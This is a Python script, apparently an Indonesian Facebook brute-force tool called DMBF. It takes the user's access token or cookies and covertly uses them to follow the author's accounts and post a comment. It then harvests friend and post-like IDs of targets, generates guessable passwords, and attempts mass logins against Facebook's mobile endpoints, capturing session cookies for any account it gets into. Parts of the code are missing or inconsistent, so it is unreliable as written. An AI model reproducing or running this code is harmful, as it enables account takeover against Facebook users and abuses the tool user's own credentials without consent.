#!/usr/bin/python2
# coding=utf-8
#fb:facebook.com/ih.wibu.14
#fb:facebook.com/ih.wibu.14
# RECOD GUE BANTAI LU ANJING
q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[1;92m'
c='\033[1;96m'
m='\033[1;91m'
u='\033[1;95m'
k='\033[1;93m'
p='\033[1;97m'
h='\033[1;90m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # BIRU MUDA
H = '\x1b[1;92m' # UNGU
K = '\x1b[1;93m' # HIJAU
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # KUNING
O = '\x1b[1;96m' # MERAH
N = '\x1b[0m'    # WARNA MATI
try:
	import requests
	import sys
	import os
	import subprocess
	import random
	import time
	import re
	import json
	import uuid
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
	from datetime import datetime
except Exception as modul:
	print(" \033[0;97m[\033[0;91m!\033[0;97m] Module requests not installed yet")
	exit(" \033[0;97m[\033[0;93m#\033[0;97m] Please Type : pip2 install requests")

loop = 0
ok = []
cp = []
id = []
pwx = []
animasis = ["[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]", "[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□","[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]","[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■] LOGIN BERHASIL MOHON TUNGGU NJING"]        
for i in range(len(animasis)):
	time.sleep(0.02)
	sys.stdout.write("\r\x1b[1;95m#\x1b[1;92mLoading "+ random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;92m', '\x1b[1;91m','\x1b[1;94m']) + animasis[i % len(animasis)])
	sys.stdout.flush()

s = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
ip = s.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
durasi = str(datetime.now().strftime('%d-%m-%Y'))
	
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
def __cekfol__():
	ua = s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
	os.system("clear")
	try:
		token = open('/results')
		menu()
	except (KeyError,IOError):
		os.system("-mkdir /results")
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/Dumai-200/Server-Dmbf/main/ua.txt").text.strip()
#	__cekfol__()
#	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('.ua')
	except (KeyError,IOError):
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua.txt")
		os.system("echo 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]' >> .ua")
	os.system("clear")
	print("""||>>>>> 🅳🅸🅲🅺🆈 🅼🆄🅻🆃🅸 🅱🆁🆄🆃🅴 🅵🅾🆁🅲🅴 <<<<<||
     [▪▪▪|■■■》 [[🅳🅼🅱🅵]] 《■■■|▪▪▪]
╔═════════════════════════════════════════════╗
║╔═══════════════════════════════════════════╗║
║║███████╗═╔███░☆░☆░☆░███╗╔███████═╗╔███████░║║
║║██╔══╗██╗║██░█░░░░░█░██║║██╚══╝██║║██╚═══╝░║║
║║██║░░║██║║██░░█░░░█░░██║║██╔══╗██║║██╔═══╗░║║
║║██║░░║██║║██░░░█░█░░░██║║███████═╝║███████░║║
║║██║░░║██║║██░░░░█░░░░██║║███████═╗║██╔═══╝░║║
║║██║░░║██║║██═╗══○══╔═██║║██╚══╝██║║██║░░░░░║║
║║██╚══╝██╝║██░║░░░░░║░██║║██╔══╗██║║██║░░░░░║║
║║███████╝═╚██═════════██╝╚███████═╝╚██╝░░░░░║║
║╚═══════════════════════════════════════════╝║
╚═════════════════════════════════════════════╝
╔═════════════════════════════════════════════╗
║🅳🅸🅲🅺🆈---------🅼🆄🅻🆃🅸-------🅱🆁🆄🆃🅴----🅵🅾🆁🅲🅴     ║
╚═════════════════════════════════════════════╝""")
def bot_komen():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
        os.system('rm -rf login.txt')
    requests.post('https://graph.facebook.com/100003723696885/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100000298627412/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/4481379231881987/comments?message=Ganteng Dulu KONTOL :V!&access_token={t}')
    print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
    menu()

def login():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		
		print("\n \033[0;97m  METHODE LOGIN:.........?")
		print(" \033[0;97m[\033[0;96m1\033[0;97m] Login Pakai Token ")
		print(" \033[0;97m[\033[0;96m2\033[0;97m] Login Pakai Cookies")
		ask = raw_input("\n \033[0;97m[\033[0;93m?\033[0;97m] Pilih Salah Satu NJENG! : ")
		if ask =="":
			login()
		elif ask == "1" or ask == "01":
			tokenz()
		elif ask == "2" or ask == "02":
			cookie()
		else:
			login()
			
def cookie():
	logo()
	print("\n \033[0;97m[\033[0;93m*\033[0;97m] Cara Ambil Cookies : https://youtu.be/X7m_O_tZnTc")
	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukkan Cookies : \033[0;96m")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	bot_komen()
	
def tokenz():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print("\n \033[0;97m[\033[0;93m*\033[0;97m] Cara Ambil Token : https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed")
		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Masukan Token : \033[0;96m")
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			avsid = open("login.txt", 'w')
			avsid.write(token)
			avsid.close()
			bot_komen()
		except KeyError:
			exit(" \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid")

def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as w:
    print(("  {} Tidak Ada Ingfo login,  silahkan Lomgin ulang Lort {}").format(R,N))
    time.sleep(1)
    logs()
  ip = requests.get("https://api.ipify.org").text
  os.system("clear")
  banner()
  print(("[+]WELCOME : "+nama));time.sleep(0.07)
  print(("[+]UID     : " +id));time.sleep(0.07)
  print(("\033[0;97m[+]IP      : "+ip));time.sleep(0.07)
  print ("\033[0;97m[+]──────────────────────────────────────────────────")
  print ("\033[0;97m[1]Dump ID Teman Publik");time.sleep(0.07)
  print ("\033[0;97m[2]Dump ID Like Postingan Status");time.sleep(0.07)
  print ("\033[0;97m[3]Mulai Crack");time.sleep(0.07)
  print ("\033[0;97m[4]Update SC")
  print ("\033[0;97m[0]LogOut");time.sleep(0.07)
  
  r=input("[+] : \033[1;97m");time.sleep(0.07)
  
  if r=="":print(("{} Isi yang bener{}").format(R,N));menu()
  elif r=="1":
    publik()
  elif r=="2":
    crack_like()
  elif r=="3":
    methode()
    exit()
  elif r=="4":
    print("Sedang Mengupdate!!!");time.sleep(2)
    os.system("git pull")
    input("[Kembali]")
    os.system("python2 ivv.py")
  elif r=="0":
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print(("\x1b[91m Error file tidak ditemukan  %s\x1b[0m"%e))
  else:
    print(("\x1b[91mwrong input !"));menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(("{}Cookies Invalid!{}").format(R,N))
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
		print ("\033[1;97[+]: Ketik > me Jika anda ingin Mengambil id dari daftar teman!");time.sleep(0.07)
		print ("\033[0;97m[+]──────────────────────────────────────────────────")
		idt = input("\033[1;97m[+]: User ID Target :\033[1;97m ");time.sleep(0.07)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("\033[1;97m[+]: Nama Akun :\033[1;93m "+op["name"]))
		except KeyError:
			print(("{}ID NOT found !{}").format(R,N))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		print('\033[1;97m(\033[1;91m%\033[1;97m)\033[1;94m-> \033[1;97mMengambil Semua ID ...')
		
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(("\r%s "%(str(len(id)))), end=' ');sys.stdout.flush();time.sleep(0.007)
			print((a["name"]))
		ys.close()
		print(('Suksesk mengambil Id : %s'%op['name']));time.sleep(0.07)
		print(("Total ID  : \033[1;97m %s"%(len(id))));time.sleep(0.07)
		print(("Output                   \033[1;94m: \033[1;97m %s"%qq));time.sleep(0.07)
		print ("\033[0;97m[+]──────────────────────────────────────────────────")
		input("Kembali klik Enter :\033[1;97m")
		menu()
		
	except Exception as e:
		exit("error: %s"%e)
def crack_like():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print('Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	idt = input("ID Postingan Publik/Teman :");time.sleep(0.07)
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+toket)
		ids = []
		z = json.loads(r.text)
		qq = (idt+'.json').replace(" ","_")
		ys = open(qq , 'w')
		print("Mengambil semua ID")
		
		for i in z['data']:
			ids.append(i['id'])
			ys.write(i['id']+"<=>"+i['name']+'\n')
			print("\r%s "%(str(len(ids))), end =' '),;sys.stdout.flush();time.sleep(0.007)
			print(i["name"])
		ys.close()
		
		print('\n[+]Sukses Mengambil ID dari Like');time.sleep(0.07)
		print("[+]Total ID : %s"%(len(ids)));time.sleep(0.07)
		print("[+]Output : %s"%qq);time.sleep(0.07)
		input("\n[Kembali]")
		menu()
			
	except KeyError:
		print("\x1b[91mID postingan salah\x1b[0m")
		menu()
	except requests.exceptions.SSLError:
		print('!Koneksi Tidak Ada')
		exit()
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack m.fb
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
	return results
	
def methode():
  print(" \033[0;97m[1] Crack with mbasic");time.sleep(0.07)
  print(" \033[0;97m[2] Crack with m.facebook.com");time.sleep(0.07)
  print(" \033[0;97m[3] Crack with b-api.facebook.com");time.sleep(0.07)
  sek=input("\n\033[0;97m[+]Input: ");time.sleep(0.07)
  
  if sek=="":print((" {} isi yang bener{}").format(R,N));methode()
  elif sek=="1":
    crack()
  elif sek=="2":
    crack1()
  elif sek=="3":
    crack2()
  else:
  	print((" {} isi yang benar{}").format(R,N));methode()
def logs():
  print("Mengecek Versi");time.sleep(2);os.system("git pull");time.sleep(1)
  os.system("clear")
  banner()
